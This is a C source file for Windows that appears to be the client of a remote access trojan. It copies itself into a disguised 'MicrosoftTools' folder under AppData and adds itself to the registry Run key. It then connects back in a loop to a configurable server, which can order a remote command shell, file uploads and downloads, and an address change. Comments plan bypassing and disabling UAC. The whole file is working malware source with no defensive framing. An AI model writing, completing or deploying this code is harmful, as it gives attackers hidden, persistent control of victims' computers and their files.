#include <stdio.h>
#include <dirent.h>
#include <locale.h>
#include <windows.h>
#include "EA_Socket.h"
#include "process.h"

int port = 5005;
char ip[16] = "127.0.0.1";
char lastFolderName[60] = "MicrosoftTools";

static void defect(void);
static void lifeOnSystem(void);
static void onlyRunCommand(char * cmd);
static void readIpPortFromFile(void);
static int process(SOCKET sckt, char * al);

int main()	// gcc --machine-windows
{
	WSADATA _wsdata;

	//setlocale(LC_ALL, "Turkish");

	//TODO: ByPass UAC

	defect();

	while (WSAStartup(MAKEWORD(2, 0), &_wsdata) != 0)
	{
		Sleep(500);
	}

	lifeOnSystem();
	
	WSACleanup();

	return 0;
}

static void defect(void)
{
	int i;
	DIR * dir;
	char targetPath[100] = {0};
	char srcPathwithName[MAX_PATH + 1] = {0};

	GetModuleFileNameA(NULL, (TCHAR *)srcPathwithName, MAX_PATH + 1);
	i = strlen(srcPathwithName);
	while(srcPathwithName[--i] != '\\');

	sprintf(targetPath, "C:\\Users\\%s\\AppData\\Local\\%s", getenv("USERNAME"), lastFolderName);
	dir = opendir(targetPath);

	if (dir)
	{
		if (strncmp(srcPathwithName + i - strlen(lastFolderName), lastFolderName, strlen(lastFolderName)) != 0)
		{
			closedir(dir);
			exit(0);
		}
		closedir(dir);
	} else {
		char command[400] = {0};

		sprintf(command, "/c mkdir %s", targetPath);
		onlyRunCommand(command);

		sprintf(command, "/c copy %s %s\\%s", srcPathwithName, targetPath, srcPathwithName + i + 1);
		onlyRunCommand(command);

		sprintf(command, "%s\\%s", targetPath, srcPathwithName + i + 1);
		HKEY hKey;
		char * czStartName = srcPathwithName + i + 1;
		char * czExePath   = command;

		LONG lnRes = RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);

		if(ERROR_SUCCESS == lnRes)
		{
			lnRes = RegSetValueExA(hKey, czStartName, 0, REG_SZ, (unsigned char *)czExePath, strlen(czExePath));
		}

		RegCloseKey(hKey);

		sprintf(command, "/c start %s\\%s", targetPath, srcPathwithName + i + 1);
		onlyRunCommand(command);

		//TODO: Disable UAC to run again

		exit(0);
	}
}

static void lifeOnSystem(void)
{
	char * al;
	SOCKET sckt;
	int de, check = 0;
	struct sockaddr_in veriler;

	readIpPortFromFile();

	while (1)
	{
		sckt = socket(AF_INET, SOCK_STREAM, 0);

		veriler.sin_family = AF_INET;
		veriler.sin_port = htons(port);
		veriler.sin_addr.s_addr = inet_addr(ip);
		memset(&(veriler.sin_zero), 0, 8);

		if (sckt != INVALID_SOCKET && sckt != SOCKET_ERROR)
		{
			while (1)
			{
				if((check = connect(sckt, (struct  sockaddr *)&veriler, sizeof(veriler))) == -1)
				{
					break;
				}

				Sleep(500);
			}

			while(1)
			{
				if ((al = recverText(sckt)) == NULL)
				{
					break;
				}

				if ((de = process(sckt, al)) != 0)
				{
					break;
				}

				free(al);
			}

			closesocket(sckt);
		}

		Sleep(1000);
	}
}

static void onlyRunCommand(char * cmd)
{
	BOOL bSuccess = FALSE;
	STARTUPINFO siStartInfo;
	PROCESS_INFORMATION piProcInfo;

	ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
	ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));

	siStartInfo.cb = sizeof(STARTUPINFO);

	bSuccess = CreateProcessA(TEXT("C:\\Windows\\System32\\cmd.exe"), cmd,
		NULL, NULL, TRUE,
		CREATE_NO_WINDOW, // CREATE_NO_WINDOW CREATE_NEW_CONSOLE
		NULL, NULL, &siStartInfo, &piProcInfo
	);

	if (!bSuccess)
	{
		return;
	}
	else
	{
		CloseHandle(piProcInfo.hProcess);
		CloseHandle(piProcInfo.hThread);
	}

	Sleep(500); //TODO: process tam açýlana kadar beklenmeli
}

static void readIpPortFromFile(void)
{
	FILE * fIpPort;

	fIpPort = fopen("dt", "r");

	if (fIpPort != NULL)
	{
		fscanf(fIpPort,"%s %d", ip, &port);
		fclose(fIpPort);
	}
}

static int process(SOCKET sckt, char * al)
{
	if (strcmp(al, "cmd") == 0)
	{
		processCMD(sckt);
	}
	else if (strncmp(al, "getFile ", 8) == 0)
	{
		processFileUpload(sckt, al + 8);
	}
	else if (strncmp(al, "sendFile ", 9) == 0)
	{
		processFileDownload(sckt, al + 9);
	}
	else if (strcmp(al, "update") == 0)
	{
		// TODO: processUpdate(sckt);
	}
	else if (strncmp(al, "ipsil ", 6) == 0)
	{
		// TODO: remove public ip from exe
	}
	else if (strncmp(al, "ip:port ", 8) == 0)
	{
		processIpPort(al + 8);
	}

	return 0;
}
